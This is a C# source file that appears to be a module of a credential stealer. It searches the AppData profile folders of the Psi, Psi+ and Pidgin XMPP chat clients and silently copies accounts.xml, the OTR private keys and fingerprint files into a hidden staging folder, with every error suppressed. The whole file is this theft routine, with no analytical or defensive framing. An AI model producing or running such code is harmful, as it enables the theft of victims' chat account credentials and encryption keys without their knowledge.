using System;
using System.IO;

namespace jaber
{
    class jabber
    {
        public static void jab()
        {
            try
            {
                string psiplus = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Psi+\profiles\default\";
                string pidgin = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\.purple\";
                string psi = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Psi\profiles\default\";
                try
                {


                    if (Directory.Exists(psi))
                    {
                        Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Windows\Jabber\Psi");
                        string[] psifiles = Directory.GetFiles(psi); // getting all files in psi dir

                        foreach (string x in psifiles)
                        {
                            try
                            {
                                FileInfo f = new FileInfo(x);
                                if (f.Name == "accounts.xml")
                                {
                                    File.Copy(x, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Windows\Jabber\Psi\accounts.xml"); // copying accounts xml 
                                }
                                if (f.Name == "otr.keys")
                                {
                                    File.Copy(x, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Windows\Jabber\Psi\otr.keys");// copying otr.keys 
                                }
                                if (f.Name == "otr.fingerprints")
                                {
                                    File.Copy(x, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Windows\Jabber\Psi\otr.fingerpits");// copying otr.fingerprints
                                }
                            }
                            catch
                            {
                            }

                        }
                    }
                }
                catch
                {
                }
                if (Directory.Exists(psiplus)) // same everywhere
                {
                    Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Windows\Jabber\Psi+");
                    string[] psifiles2 = Directory.GetFiles(psiplus);

                    foreach (string xx in psifiles2)
                    {
                        try
                        {
                            FileInfo f2 = new FileInfo(xx);
                            if (f2.Name == "accounts.xml")
                            {
                                File.Copy(xx, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Windows\Jabber\Psi+\accounts.xml");
                            }
                            if (f2.Name == "otr.keys")
                            {
                                File.Copy(xx, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Windows\Jabber\Psi+\otr.keys");
                            }
                            if (f2.Name == "otr.fingerprints")
                            {
                                File.Copy(xx, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Windows\Jabber\Psi+\otr.fingerpits");
                            }
                        }
                        catch
                        {
                        }

                    }
                }
                if (Directory.Exists(pidgin))
                {
                    Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Windows\Jabber\Pidgin");
                    string[] psifiles3 = Directory.GetFiles(pidgin);

                    foreach (string xxx in psifiles3)
                    {
                        try
                        {
                            FileInfo f3 = new FileInfo(xxx);
                            if (f3.Name == "accounts.xml")
                            {
                                File.Copy(xxx, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Windows\Jabber\Pidgin\accounts.xml");
                            }
                            if (f3.Name == "otr.keys")
                            {
                                File.Copy(xxx, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Windows\Jabber\Pidgin\otr.keys");
                            }
                            if (f3.Name == "otr.fingerprints")
                            {
                                File.Copy(xxx, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Windows\Jabber\Pidgin\otr.fingerpits");
                            }
                        }
                        catch
                        {
                        }

                    }
                }
            }
            catch
            {
            }
        }

    }
}
